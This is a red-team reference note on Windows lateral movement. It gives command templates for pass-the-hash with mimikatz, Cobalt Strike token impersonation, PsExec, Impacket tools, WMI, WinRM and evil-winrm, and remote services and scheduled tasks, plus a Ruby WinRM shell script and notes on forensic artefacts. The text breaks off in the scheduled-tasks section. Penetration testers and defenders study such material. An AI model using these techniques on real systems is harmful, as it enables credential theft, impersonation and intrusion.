# Windows - Lateral movements

### Expired password renewal

Expired password of local or domain accounts can be renewed over `SMB`
(`MSRPC-SAMR`) using `impacket`'s `smbpasswd.py` Python script. `smbpasswd.py`
supports authentication using an account `NTLM` hash.

```
smbpasswd.py [-newpass '<NEW_PASSWORD>'] <USERNAME>[:<CURRENT_PASSWORD>]@<HOSTNAME | IP>
smbpasswd.py [-newpass '<NEW_PASSWORD>'] -hashes <CURRENT_NT_HASH> <USERNAME>@<HOSTNAME | IP>
```

The account's previous password can be restored using `mimikatz`'s
`lsadump::changentlm` function with only the knowledge of the previous `NTLM`
hash. Note that the minimum password age policy setting may prevent an
immediate password restoration.

```
mimikatz # privilege::debug
mimikatz # lsadump::changentlm /server:<DC_FQDN | HOSTNAME> /user:<USERNAME> [/oldpassword:<CURRENT_PASSWORD> | /old:<CURRENT_NT_HASH>] [/newpassword:<NEW_PASSWORD> | /new:<NEW_NT_HASH>]
```

### Local credential re-use

The local re-use of credentials consist of starting a process on the local
system under the security context and privileges of the specified user.

This security context may be used to access resources on the present system as
well as moving laterally using various methods (remote Windows services or
scheduled tasks, `WMI`, etc.) that can rely on the current user security
context.

###### runas

Set the main DNS server on the attacking computer to the Domain Controller IP
address:

```
Control Panel -> Network and Internet -> Network and Sharing Center -> Change adapter setting -> right click on the adapter being used -> Properties -> Internet Protocol Version 4 (TCP/IPv4) -> Properties -> Set the Preferred DNS server field  
```

To authenticate locally as another user (with plaintext credentials) and
execute PowerShell commands, the `runas` utility can be used.

```
# runas
# Use /NetOnly on off-domain machines
runas /NetOnly /user:<DOMAIN>\<USERNAME> "<COMMAND> <COMMAND_ARGS>"
runas /NetOnly /user:<DOMAIN>\<USERNAME> powershell.exe
```

The `NetOnly` option will make `runas` execute on your local computer as the
currently logged on user, but any connections to other computers on the network
will be made using the user account specified.

###### Start-Process / Start-Job

The `Start-Process` and `Start-Job` PowerShell cmdlets can be used to start a
local process under the identify of another user.

To run the specified process in an elevated security context through a
interactive logon on a system with `User Account Control (UAC)` enabled, the
`-Verb RunAs` parameter, for `Run as administrator`, can be specified.

```
$secpasswd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("<DOMAIN>\<USERNAME>", $secpasswd)

Start-Process <cmd.exe | powershell.exe | ...> -Credential $creds
Start-Process <cmd.exe | powershell.exe | ...> -Credential $creds -Verb RunAs

$ProcessJob = Start-Job -ScriptBlock { <POWERSHELL> } -Credential $creds
Wait-Job $ProcessJob
Receive-Job -Job $ProcessJob
```

###### Cobalt Strike runas, runu, spawnas, spawnu and make_token

On `Cobalt Strike`, the `runas` and `spawnas` beacon commands can be used,
respectively, to locally run a command or start a beacon under the security
context of the specified user. Both commands rely on a clear password and
cannot be used to Pass-the-Hash.

The `runas` command can also be used in place of the `spawnas` command by
running the beacon deploying `PowerShell` one-liner, generated using the beacon
built-in function `Access -> One-liner`.

```
beacon> runas <. | DOMAIN>\<USERNAME> <PASSWORD> <COMMAND> <COMMAND_ARGS>

beacon> spawnas <. | DOMAIN>\<USERNAME> <PASSWORD> <LISTENER>
```

The `make_token` beacon command correspond to the `runas` `NetOnly` option but
cannot be used to create a process and run a specified program. The
`make_token` command will instead replace the `Logon Session` in the current
beacon Windows `Access Token`, which is used for network Windows
authentication, with the `make_token` provided credentials. The local system
access through the beacon will thus not be affected but access to resources
over the network will be made using the newly provided credentials.   

The change can be reverted using the beacon command `rev2self`.

```
beacon> make_token <. | DOMAIN>\<USERNAME> <PASSWORD>
```

If elevated privileges are obtained on a system, the `runu` beacon command can
be used to run an arbitrary command as a child of another process, effectively
running the command in the targeted process security context. Building on this
primitive, the `spawnu` beacon command spawn a beacon, through PowerShell,
under another process security context.

Both commands can be used to impersonate any connected user on the compromised
system, without the need of knowing their password or `NTLM` hash, as well as
elevate to `NT AUTHORITY\SYSTEM`.  

```
# beacon> ps

beacon> runu <PID> <COMMAND> <COMMAND_ARGS>

beacon> spawnu <PID> <LISTENER>
```

###### Mimikatz Pass-The-Hash

Require elevated privileges on the system.

The Pass-The-Hash module of `mimikatz` can be used to locally run a process
under another user identity using its `NTLM` hash.

```
# Default to /run:cmd.exe.
# Command can be any binary such as powershell.exe or mmc.exe for example.
# Specifying arguments is supported as well.

sekurlsa::pth /domain:<. | DOMAIN_FQDN> /user:<USERNAME> /ntlm:<HASH_NTLM> /run:"<COMMAND>"
sekurlsa::pth /domain:<. | DOMAIN_FQDN> /user:<USERNAME> [/aes128:<USER_AES128_KEY> | /aes256:<USER_AES256_KEY>] /run:"<COMMAND>"
```

###### Cobalt Strike (using Mimikatz) Pass-The-Hash

Require elevated privileges on the system.

On `Cobalt Strike`, the `mimikatz` / and `steal_token` beacon commands can be
used to start a process under the specified user identity, using its `NTLM`
hash, and steal then impersonate the newly created process token.

The `pth` beacon command will wrap the `mimikatz` Pass-the-hash command and,
similarly to the `make_token` beacon command, replace the `Logon Session` in
the current beacon Windows `Access Token`, in order to access resources over
the network using the provided user identity.

Any token change can be reverted using the beacon command `rev2self`.

```
# Both local and over the network impersonation
beacon> mimikatz sekurlsa::pth /domain:<. | DOMAIN_FQDN> /user:<USERNAME> /ntlm:<NT_HASH> /run:"powershell -w hidden"
beacon> mimikatz sekurlsa::pth /domain:<. | DOMAIN_FQDN> /user:<USERNAME> [/aes128:<USER_AES128_KEY> | /aes256:<USER_AES256_KEY>] /run:"powershell -w hidden"
  [...]
  PID <PID>

beacon> steal_token <PID>

# Over the network ("/NetOnly") impersonation
pth <. | DOMAIN>\<USERNAME> <NT_HASH>
```

###### PowerShell Credential option

Most of the PowerShell's `Remote Server Administration Tools (RSAT)` cmdlets
support the `Credential` option, to run the cmdlet as the specified user
account. An username or a `PSCredential` object can be used.

A similar mechanism is also implemented in the PowerShell `PowerSploit`
framework.

### Lateral movements

Multiples techniques can be used to access computers remotely:

| Technique / Service | Port | Required privileges | Pass-the-Hash? |
|---------------------|------|------------|---------------|
| `PsExec` | `SMB`: TCP Port 445 <br> or <br> `SMB` over `NetBIOS`: TCP port 139 | If `User Account Control (UAC)` is disabled (`EnableLUA` set to `0x0`): <br> Any local and domain accounts members of the local `Administrators` group <br><br> If `UAC` is enabled (`EnableLUA` set to `0x1`) in default configuration (standard since `Windows Vista` / `Windows Server 2008`): <br> Local built-in `Administrator` (RID: `500`) <br> Domain accounts members of the local `Administrators` group (SID: `S-1-5-32-544`) <br><br> If `UAC` remote restrictions are disabled (`LocalAccountTokenFilterPolicy` set to `0x1`): <br> Any local (and domain) accounts members of the local `Administrators` group <br><br> If `UAC` is enforced for the local built-in `Administrator` account `RID` 500 (`FilterAdministratorToken` set to `0x1`): <br> Only domain accounts members of the local `Administrators` group | Network logon <br> -> Yes |
| `Remote Desktop Protocol (RDP)` | `Terminal Services`	TCP port 3389 | Any local and domain accounts members of the local `Administrators` (SID: `S-1-5-32-544`) or `Remote Desktop Users` (SID: `S-1-5-32-555`) groups | Yes, if `Restricted Admin` mode is enabled server-side  |
| `Windows Management Instrumentation (WMI)` | `RPC` TCP port 135 <br> `RPC` randomly allocated high TCP ports: <br> - TCP ports 1024 - 5000 (<= Windows 2003R2) <br> - TCP ports 49152 - 65535 | Similar privileges to `PsExec` | Network logon <br> -> Yes |
| `Windows Remote Management (WinRM)` | `WinRM 1.1 and earlier`: <br> `HTTP` port 80 <br> or <br> `HTTPS` port 443 <br><br> `WinRM 2.0`: <br> `HTTP` port 5985 <br> or <br> `HTTPS` port 5986 | Similar privileges to `PsExec` with the addition of membership to the `Remote Management Users` (SID: `S-1-5-32-580`) group | Network logon <br> -> Yes |
| `Distributed Component Object Model (DCOM)` | Same TCP ports as `WMI` | Similar privileges to `PsExec` with the addition of membership to the `Distributed COM Users` (SID: `S-1-5-32-562`) group depanding on the target host configuration | Network logon <br> -> Yes |
| Remote Windows services | TCP port 445 | Similar privileges to `PsExec` | Network logon <br> -> Yes |
| Remote scheduled tasks | TCP port 445 | Similar privileges to `PsExec` | Network logon <br> -> Yes |
| Third parties remote administration IT tools | `AnyDesk`: TCP port 7070 <br> `TeamViewer`: TCP / UDP ports 5938 <br> ... | Technology dependent | Likely not |

To quickly identity which servers or workstations in the domain are exposing
one of the service above from your network standpoint, AD queries and `nmap`
can be used in combination (refer to the `[Active Directory] Methodology -
Domain Recon` note).

Note that the `Impacket` Python scripts presented below are available as static
stand-alone binaries for both Windows and Linux x64 operating systems on the
following GitHub repository:

```
https://github.com/Qazeer/OffensivePythonPipeline

https://github.com/ropnop/impacket_static_binaries
```

**For the forensics artefacts induced by the different lateral movement
technics refer to the `[DFIR] Windows - Analysis - Lateral movement` note.**

###### [Over SMB] PsExec-like utilities

`PsExec`-like utilities operate under the same general principle:
  - Upload of a binary on the targeted system, usually through the `ADMIN$` or
  `C$` Windows built-in `SMB` shares.
  - Execution of the uploaded binary through the creation and execution of a
  Windows service, leveraging the `Service Control Manager (SCM)` service
  through the `MSRPC` protocol (`SVCCTL` interface).

The aforementioned actions require the following elevated privileges on the
targeted system, usually given to members of the local `Administrators` group:
    - Write permission on any network share (both `NTFS` and `Share` write
      permission). `PsExec` however requires specifically write permission to
      the `ADMIN$` share. If necessary, a writable share can be configured
      remotely through the `Server Service` `MSRPC` interface.
    - Permissions to create (`SC_MANAGER_CREATE_SERVICE`) and start
      (`SERVICE_QUERY_STATUS` + `SERVICE_START`) Windows services.  

The execution of a `PsExec`-like utility will notably, in addition to
`Security` `EID 4624` and `EID 4672` events, generate the following Windows
events:
  - `System` hive, `EID 7045: A service was installed in the system`.
  - `Security` starting from the Windows Server 2016 and Windows 10 operating
    systems, `EID 4697: A service was installed in the system`.
  - `System` hive, `EID 7036: The <SERVICE_NAME> service entered the
    <running/stopped> state`.

*Writable network share*

The `smbmap` Python script can be used to list the shares, and their
configured permissions, on the remote system and the `rpcclient` utility
can be used to call the `NetShareAdd` function of the `Server Service` `MSRPC`
interface in order to create a share on the remote system.

According to the Microsoft documentation, only members of the `Administrators`,
`System Operators`, or `Power Users` local groups can add shares using the
`NetShareAdd` function. The `Print Operator` can however add printer
shares.

```
# The <HASH> should be specified in the <LM_HASH:NT_HASH> format (<aad3b435b51404eeaad3b435b51404ee:NT_HASH>)
smbmap [-d <DOMAIN>] [-u <USERNAME>] [-p <PASSWORD | HASH>] (-H <HOSTNAME | IP> | --host-file <FILE>)  

rpcclient -U "<USERNAME>" [--pw-nt-hash] <HOSTNAME | IP>

rpclient $> netshareadd "<C:\Windows | SHARE_PATH>" "<SHARE_NAME>" <MAX_USERS> "<COMMENT>"
```

An utility supporting the specification of the remote share to write the binary
to, such as the `Metasploit`'s `exploit/windows/smb/psexec` module or
the `Impacket`'s `smbexec.py` Python script can then be leveraged to execute
code on the remote system.

*PsExec*

The `PsExec` CLI utility, from the Microsoft `sysinternals` suite and signed by
Microsoft, can be used to execute commands, locally or remotely and under the
current user or specified user identity.

While the use of a more complete attack framework is recommended on the
attacking machine (such as `Cobalt Strike`, `CrackMapExec` or `Metasploit`),
`PsExec` may be uploaded on a compromised host in order to futher reach
segregated targets as it will not raise alerts against some anti-virus
solutions.

`PsExec` uses a named pipe over the `Server Message Block (SMB)` protocol,
which runs on `TCP` port 445. The utility will connect to the `ADMIN$` share of
the targeted host, upload the `PSEXESVC.exe` binary and use the `Service
Control Manager` to start the aforementioned binary.

Note that while the name of the created service can be specified, the name of
the uploaded binary cannot be changed, resulting in known forensics artefacts
on the accessed system associated to the use of `PsExec`, such as:
  - A Windows `Security` event `EID 4624: An account was successfully logged
    on` with its `Process Name`	field set to `C:\Windows\PSEXESVC.exe`.    
  - A `PSEXESVC.EXE` entry in the `Shimcache` / `Amcache`
  - A possible record in the `Master File Table (MFT)` and `Update Sequence
  Number Journal (USN) Journal`

If an user is specified using the `-u` option, an interactive logon (`Logon
type 2`) will be attempted by `PsExec`, resulting in the storing of the given
user `NTLM` hash in `LSASS` memory. For logons attempted using the  current
user identity, `PsExec` will conduct network logon (`Logon type 3`).

```
# -s - Runs the remote process as the System account (NT AUTHORITY\SYSTEM).
# -h - If the targeted system is using the Windows Vista operating system, or higher, the created process will attempt to be run with the account's elevated token.
# -r <SERVICE_NAME> - Specifies the name of the remote service to create. Default to PSEXESVC.

# Interactive commands execution through cmd or PowerShell
PsExec.exe -accepteula \\<HOST | IP> -s <cmd.exe | %ComSpec% | powershell.exe>
PsExec.exe -accepteula \\<HOST | IP> -u "<DOMAIN | WORKGROUP>\<USERNAME>" -p "<PASSWORD>" -s <cmd.exe | %ComSpec% | powershell.exe>

# Unitary command execution on one or multiple specified hosts.
# PsExec hosts specified file should be encoded in ANSI.
PsExec.exe -accepteula [\\<IP | HOSTNAME | IPS | HOSTNAMES> | @<FILE_FULL_PATH>] -u "<DOMAIN | WORKGROUP>\<USERNAME>" -p "<PASSWORD>" -s <cmd.exe /c "<COMMAND> <COMMAND_ARGS>" | %ComSpec% /c "<COMMAND> <COMMAND_ARGS>" | powershell.exe -NoP -NonI -W Hidden -Exec Bypass -C "<COMMAND> <COMMAND_ARGS>" | powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc <ENCODED_BASE64_CMD> | ...>
```

*Metasploit PsExec*

The `exploit/windows/smb/psexec` `Metasploit` module can be used to execute a
`Metasploit` payload, such as a `Meterpreter`, on a targeted system using a
cleartext password or an `NTLM` hash.

This module will by default generate a service with a random name and
description and allows the specification of a network share.

```
# If using a password hash, set SMBPass to <LM_HASH:NT_HASH>
msf> use exploit/windows/smb/psexec
```

*Impacket psexec.py*

The `Impacket`'s `psexec.py` Python script will upload and execute the
`RemComSvc` service, based on the open-source `RemCom` project.

`psexec.py` present the advantage of supporting both `NTLM`, uisng a cleartext
password or an `NTLM` hash, and `Kerberos` authentication, using a
`Ticket-Granting Ticket (TGT)` or a `service ticket` for the remote machine
`CIFS` service. For more information on how to make use of `service tickets`
(`Pass-the-Ticket`), refer to the `[ActiveDirectory] Kerberos - silver tickets`
note.

`psexec.py` will by default upload a binary and generate a service with a
random name and allows the specification of a network share.

```
# --target-ip: Specifies the IP address of the targeted machine. If omitted, psexec.py will use the host or IP pecified in the target string. The option is useful when the target is an unresolvable NetBIOS name.

# NTLM authentication
psexec.py [-target-ip <TARGET_IP>] [-port [<PORT>]] [<DOMAIN>/]<USERNAME>[:<PASSWORD>]@<HOSTNAME | IP> [<COMMAND> <COMMAND_ARGS>]
psexec.py -hashes <LM_HASH:NT_HASH> [-target-ip <TARGET_IP>] [-port [<PORT>]] [[<DOMAIN>/]<USERNAME>@<HOSTNAME | IP> [<COMMAND> <COMMAND_ARGS>]

# Kerberos authentication
export KRB5CCNAME=<TICKET_CCACHE_FILE_PATH>
psexec.py -k -no-pass -dc-ip <DC_IP> <HOSTNAME> [<COMMAND> <COMMAND_ARGS>]
```

Additionally, `psexec.py` can easily be incorporated into custom Python
scripts:

```
import psexec

psobject = psexec.PSEXEC("cmd.exe", "c:\\windows\\system32\\", None, "445/SMB", username = '<USERNAME>', password = '<PASSWORD>')
raw_result = psobject.run("<HOSTNAME | IP>")
print raw_result
psobject.kill();
```

*Invoke-SMBExec*

The `Invoke-SMBExec` PowerShell cmdlet can be used to pass the hash over SMB in
PowerShell.

The `Invoke-SMBExec` cmdlet will by default upload a binary and generate a
service with a random name.

```
Invoke-SMBExec -Target <HOSTNAME | IP> -Domain <DOMAIN> -Username <USERNAME> -Hash <NTLMHASH> -Command "<CMD>" -verbose
```

###### [Over SMB] *Fileless* PsExec-like utilities

The `Impacket`'s `smbexec.py` Python script and the `Metasploit`'s
`exploit/windows/smb/psexec` module implement a fileless variation of
`PsExec`. Instead of uploading a binary, the created Windows service will
execute Windows built-in binaries.

`smbexec.py` rely on `%COMSPEC%` (`cmd.exe`) and will, for each specified
command, create a Windows service that `echo` the command in a temporary file
(`%TEMP%\execute.bat`), then execute and ultimately delete the `bat` file.        

The `Metasploit`'s `exploit/windows/smb/psexec` module rely on both `%COMSPEC%`
and `powershell.exe` and will create a Windows service that execute the
specified payload (bind / reverse `meterpreter`, single command, etc.) through
a `PowerShell` one-liner.  

`Metasploit` will generate a random name for the Windows service while
`smbexec.py`, by default, create a service named `BTOBTO`.

```
# NTLM authentication
smbexec.py [-service-name <SERVICE_NAME>] [-target-ip <TARGET_IP>] [-port [<PORT>]] [<DOMAIN>/]<USERNAME>[:<PASSWORD>]@<HOSTNAME | IP> [<COMMAND> <COMMAND_ARGS>]
smbexec.py [-service-name <SERVICE_NAME>] -hashes <LM_HASH:NT_HASH> [-target-ip <TARGET_IP>] [-port [<PORT>]] [[<DOMAIN>/]<USERNAME>@<HOSTNAME | IP> [<COMMAND> <COMMAND_ARGS>]

# Kerberos authentication
export KRB5CCNAME=<TICKET_CCACHE_FILE_PATH>
smbexec.py [-service-name <SERVICE_NAME>] -k -no-pass -dc-ip <DC_IP> <HOSTNAME> [<COMMAND> <COMMAND_ARGS>]

# If using a password hash, set SMBPass to <LM_HASH:NT_HASH>
msf> use exploit/windows/smb/psexec_psh
```

###### Over WMI

The `Windows Management Instrumentation (WMI)` is a Microsoft suite of tools
used to retrieve management data and manage Windows assets both locally and
over the network.  

`WMI` rely on two protocols when used over the network: `DCOM` (by default) and
`WinRM`. DCOM establishes an initial connection over TCP port 135 and any
subsequent data is then exchanged over a randomly selected TCP port.

`WMI` is divided in a collection of predefined classes. The `Win32_Process`
class can be used to start a process and the `Win32_Product` class can be used
to install an MSI installer package, both locally and remotely.

```
# <COMMAND> example: <cmd.exe | powershell.exe | cmd.exe /c '<COMMAND> <COMMAND_ARGS>' | %ComSpec% /c '<COMMAND> <COMMAND_ARGS>' | powershell.exe -NoP -NonI -W Hidden -Exec Bypass -C '<COMMAND> <COMMAND_ARGS>' | powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc <ENCODED_BASE64_CMD> | ...>

wmic /node:"<IP | HOSTNAME>" process call create "<COMMAND>"
wmic /node:"<HOST1>","<HOST2>",...,"<HOST_N>" process call create "<COMMAND>"
# Takes in input a list of hosts in the given file.
wmic /failfast:on /node:@<FILE> process call create "<COMMAND>"
wmic /user:"<DOMAIN | WORKGROUP>\<USERNAME>" /password:"<PASSWORD>" /node:<IP | HOSTNAME> process call create "<COMMAND>"

Invoke-WmiMethod -Class Win32_Process -Name Create "<COMMAND>"
Invoke-WmiMethod -ComputerName <IP | HOSTNAME> -Credential <PSCredential> -Class Win32_Process -Name Create "<COMMAND>"
```

The `Invoke-WMIExec` PowerShell cmdlet and `Impacket`'s `wmiexec.py` can be
used to pass the hash over `WMI`. `wmiexec.py` additionally supports
authentication through the Kerberos protocol.

```
Invoke-WMIExec -Target <HOSTNAME | IP> -Domain <DOMAIN> -Username <USERNAME> -Hash <NTLMHASH> -Command "<CMD>" -verbose

# NTLM authentication
wmiexec.py [-target-ip <TARGET_IP>] [-port [<PORT>]] [<DOMAIN>/]<USERNAME>[:<PASSWORD>]@<HOSTNAME | IP> [<COMMAND> <COMMAND_ARGS>]
wmiexec.py -hashes <LM_HASH:NT_HASH> [-target-ip <TARGET_IP>] [-port [<PORT>]] [[<DOMAIN>/]<USERNAME>@<HOSTNAME | IP> [<COMMAND> <COMMAND_ARGS>]

# Kerberos authentication
export KRB5CCNAME=<TICKET_CCACHE_FILE_PATH>
wmiexec.py [-service-name <SERVICE_NAME>] -k -no-pass -dc-ip <DC_IP> <HOSTNAME> [<COMMAND> <COMMAND_ARGS>]
```

###### Over WinRM

*PowerShell's WinRM remoting*

`Windows Remote Management (WinRM)` is the Microsoft implementation of
WS-Management Protocol, a standard Simple Object Access Protocol
(`SOAP`)-based, protocol that allows hardware and operating systems, from
different vendors, to interoperate. By default, `WinRM` uses the `TCP` ports
5985 and 5986 for connections, respectively over `HTTP` and `HTTPS`. For more
information about `WinRM` itself, refer to the `L7 - 5985-5986 WSMan` note.

Multiples cmdlets are incorporated into the PowerShell core to execute commands
remotely through `WinRM`, also known as `PowerShell Remoting`. Through
`PowerShell Remoting`, unitary commands can be executed or full PowerShell
sessions can be established.

Members of the Windows built-in `Administrators` and `Remote Management Users`
groups are allowed, by default, to access a remote machine through `WinRM`:

```
(Get-PSSessionConfiguration -Name Microsoft.PowerShell).Permission
  NT AUTHORITY\INTERACTIVE AccessAllowed, BUILTIN\Administrators AccessAllowed, BUILTIN\Remote Management Users AccessAllowed
```  

Refer to the `[L7] 5985-5986 WSMan` note for the listing of the different
authentication mechanisms supported by `WinRM`.

`PowerShell Remoting` can be conducted through `HTTP` / `HTTPS` proxies, if
necessary. The proxy settings can be specified through the `Internet Options`
graphical utility and set as the system-wide `Microsoft Windows HTTP Services
(WinHTTP)` proxy using `netsh`.

```
Control Panel -> Internet Options -> Connections -> LAN settings
  "Use a proxy server for your LAN [...]" checked
  (Optional) "Bypass proxy server for local addresses" checked
  Advanced -> (For WinRM over HTTP, port TCP 5985) HTTP: <127.0.0.1 | HTTP_PROXY_IP> <HTTP_PROXY_PORT>
           -> (For WinRM over HTTPS, port TCP 5986) Secure: <127.0.0.1 | HTTPS_PROXY_IP> <HTTPS_PROXY_PORT>

netsh winhttp import proxy source=ie

# Lists the configured proxies.
netsh winhttp dump
  [...]
  set proxy proxy-server="http=<HTTP_PROXY_IP>:<HTTP_PROXY_PORT>;https=<HTTPS_PROXY_IP>:<HTTPS_PROXY_PORT>" bypass-list="<local>"

# Restore the WinHTTP default proxy settings (no proxies).
netsh winhttp reset proxy
```

The `Invoke-Command`, `Enter-PSSession`, and `New-PSSession` PowerShell cmdlets
can be used to execute commands on a remote host through `WinRM`:

```bash
# PowerShell built-in cmdlets.

$user = '<DOMAIN | WORKGROUP>\<USERNAME>';
$pass = '<PASSWORD>';
$spass = ConvertTo-SecureString -AsPlainText $pass -Force;
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList $user,$spass;

# Executes a PowerShell single command.
Invoke-Command -ComputerName <HOSTNAME | IP> -Credential $creds -ScriptBlock { <POWERSHELL> };

# Enters an interactive PowerShell session.
Enter-PSSession -ComputerName <HOSTNAME | IP> -Credential $creds

# Creates an interactive PowerShell session that can be used to execute further commands, transfer files, or enter an interactive session.
$s = New-PSSession [-Credential <PSCredential>] -ComputerName <HOSTNAME | IP>
Invoke-Command -Session $s -ScriptBlock { <POWERSHELL> }
Enter-PSSession -Session $s
Copy-Item -FromSession $s -Destination "<LOCAL_PATH>" "<REMOTE_FILE_PATH>"
Copy-Item -ToSession $s -Destination "<REMOTE_PATH>" "<LOCAL_FILE_PATH>"
Remove-PSSession -Session $s

# winrs utility.

# WinRM over HTTP 5985.
winrs /noprofile -r:<HOSTNAME | IP> -u:<DOMAIN | WORKGROUP>\<USERNAME> -p:<PASSWORD> C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -Enc <BASE64_ENCODED_POWERSHELL>

# WinRM over HTTPS 5986.
winrs /noprofile /usessl -r:<HOSTNAME | IP> -u:<DOMAIN | WORKGROUP>\<USERNAME> -p:<PASSWORD> C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -Enc <BASE64_ENCODED_POWERSHELL>
```

To solve the "double hop" authentication problem, which occurs whenever trying
to access resources on a third server from the first remotely connected server,
the `CredSSP` authentication mechanism can be used. Simply put, the problem
happens because credentials are not allowed for delegation and thus can't be
passed whenever accessing network resources from the remotely connected system.
All access ends up being unauthenticated and results in `Access denied` errors.      

Supports for `CredSSP` must be activated and configured on the client attacking
system. The configuration below allows delegation to any system.

```
winrm quickconfig
Set-Item WSMan:localhost\client\trustedhosts -value *
Enable-WSManCredSSP -Role "Client" -DelegateComputer "*"

Start gpedit.msc
-> "Local Computer Policy" -> "Computer Configuration" -> "Administrative Templates" -> "System" -> "Credential Delegation"
-> In the "Settings" pane, "Allow Delegating Fresh Credentials with NTLM-only Server Authentication". -> "Enabled"
-> And in the "Options" area, "Show" -> "Value" = WSMAN/*
-> "Concatenate OS defaults with input above" checked
```

Once `CredSSP` is activated and correctly configured, the PowerShell cmdlets
`Invoke-Command` and `Enter-PSSession` can be used with the
`-Authentication CredSSP` option to make connections using `CredSSP`.

*WinRM remoting from Linux*

The following `ruby` script can be used to start a PowerShell session on a
distant Windows system through a `WinRM` service:

```ruby
require 'winrm'

# Author: Alamot

conn = WinRM::Connection.new(
  endpoint: 'http://<IP>:<PORT/wsman',
  transport: :ssl,
  user: '<USERNAME>',
  password: '<PASSWORD>',
  :no_ssl_peer_verification => true
)

command=""

conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
        print(output.output.chomp)
        command = gets
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end
    puts "Exiting with code #{output.exitcode}"
end
```

Note that the script does not support `CredSSP` authentication and is thus
prone to the "double hop" authentication problem.

The `evil-winrm` `ruby` extend the code above with a number of functionality,
such as command history and completion, upload and download of files, loading
of in memory of `PowerShell` scripts, dll or `C#` binary, etc.

```
evil-winrm -u <USERNAME> -p '<PASSWORD>' -i <HOSTNAME | IP> -s <LOCAL_PATH_PS_SCRIPTS> -e <LOCAL_PATH_EXE_SCRIPTS>
```

Supported commands:

| Command | Description |
|---------|-------------|
| download <REMOTE_PATH> <LOCAL_PATH> | Download remote file. LOCAL_PATH is not required |
| upload <LOCAL_PATH> <REMOTE_PATH> | Download remote file. |
| services | List Windows services and the associated binaries paths |
| <PS_NAME.ps1> | Load the specified PowerShell script in memory. The PowerShell script must be in the path set at -s argument **when the evil-winrm shell was started.** <br /> `menu` can be used to list the loaded cmdlets. |
| Invoke-Binary <LOCAL_BINARY_PATH> | Load the specified binary, compiled from `C#`, to be executed in memory. Accepts up to 3 arguments |
| l04d3r-LoadDll | Load dll libraries in memory, equivalent to: `[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("pwn.dll"))` |

```
l04d3r-LoadDll -smb -path \\<HOSTNAME | IP>\\<SHARE>\\<DLL>
l04d3r-LoadDll -local -path <LOCAL_DLL_PATH>
l04d3r-LoadDll -http -path http://<URL>/<DLL>
```

###### [Over SMB] Remote Windows services

The Windows built-in utility `Service Control (sc)` and the `Impacket`'s
`services.py` Python script can be used to remotely create and start a Windows
service.

Remote code execution can be achieved through a Windows service by:
    - Copying a binary to the targeted system and executing it through the
      service (`PsExec`-like).
    - Directly executing a one-liner or payload through a built-in Windows
      binary, such as `cmd.exe`.

Refer to the `[General] Shells` note for Windows reverse shell one-liners and
scripts.

Note that if the specified binary is not a service binary (i.e. a binary
implementing the `LPSERVICE_MAIN_FUNCTION` callback function), an error message
will be raised (`Error 1053: The service did not respond to the start or
control request in a timely fashion.`). The binary will however have been
executed once, which for some payload may be sufficient (`meterpreter`
notably).

```
# <SERVICE_COMMAND> example with a Windows binary: <cmd.exe /c '<COMMAND> <COMMAND_ARGS>' | %ComSpec% /c '<COMMAND> <COMMAND_ARGS>' |  %ComSpec% /c powershell.exe -NoP -NonI -W Hidden -Exec Bypass -C '<COMMAND> <COMMAND_ARGS>' | %ComSpec% /c powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc <ENCODED_BASE64_CMD> | ...>

sc \\<IP | HOSTNAME> create <SERVICE_NAME> binpath= "<SERVICE_COMMAND>"
sc \\<IP | HOSTNAME> start <SERVICE_NAME>

# NTLM authentication
services.py [-target-ip <TARGET_IP>] [<DOMAIN>/]<USERNAME>[:<PASSWORD>]@<HOSTNAME | IP> create -name <SERVICE_NAME> -display <SERVICE_DISPLAY_NAME> -path '<SERVICE_COMMAND>'
services.py [-target-ip <TARGET_IP>] [<DOMAIN>/]<USERNAME>[:<PASSWORD>]@<HOSTNAME | IP> <start | delete> -name <SERVICE_NAME>

services.py -hashes <LM_HASH:NT_HASH> [-target-ip <TARGET_IP>] [[<DOMAIN>/]<USERNAME>@<HOSTNAME | IP> create -name <SERVICE_NAME> -display <SERVICE_DISPLAY_NAME> -path '<SERVICE_COMMAND>'
services.py -hashes <LM_HASH:NT_HASH> [-target-ip <TARGET_IP>] [[<DOMAIN>/]<USERNAME>@<HOSTNAME | IP> <start | delete> -name <SERVICE_NAME>

# Kerberos authentication
export KRB5CCNAME=<TICKET_CCACHE_FILE_PATH>
services.py -k -no-pass -dc-ip <DC_IP> <HOSTNAME> create -name <SERVICE_NAME> -display <SERVICE_DISPLAY_NAME> -path '<SERVICE_COMMAND>'
services.py -k -no-pass -dc-ip <DC_IP> <HOSTNAME> <start | delete> -name <SERVICE_NAME>
```

###### Remote scheduled tasks

The Windows built-in utility `schtasks`, the `Impacket`'s `atexec.py`
Python script, and the Windows `Task Scheduler` graphical utility can be used
to remotely create and start a Windows scheduled tasks.

Remote code execution can be achieved through a Windows scheduled task by:
    - Copying a binary to the targeted system and executing it through the
      scheduled task.
    - Directly executing a one-liner or payload through a built-in Windows
      binary, such as `cmd.exe` or `powershell.exe`.

Refer to the `[General] Shells` note for Windows reverse shell one-liners and
scripts.

While `schtasks` does not have a "run now" option, a scheduled task can be
programmed to run once and starts in a few minutes. The `/Z` switch can be
specified to automatically delete the scheduled task after execution. It may
however raise compatibility issue, in which case the scheduled task would need
to be deleted manually.

`atexec.py` will create, run and immediately delete a scheduled task, by
default with a random generated name, that execute the specified command. The
scheduled task will be executed as `NT AUTHORIT\SYSTEM`. The command output
will be stored in a temporary random file and retrieved through the `ADMIN$`
share.

The Windows `Task Scheduler` utility can be used to configure remote scheduled
task through the `Microsoft Management Console (MMC)` utility:

```
File -> Add/Remove Snap-in (Ctrl + M) -> Task Scheduler -> Add
Specification of the remote computer: Another computer -> (Optional) Connect as another user

Task Scheduler (<HOSTNAME>) -> Right click -> Create task...

  General -> Name
          -> Description
          -> Run whether user is logged on or not
          -> Hidden
          -> Run with highest privileges
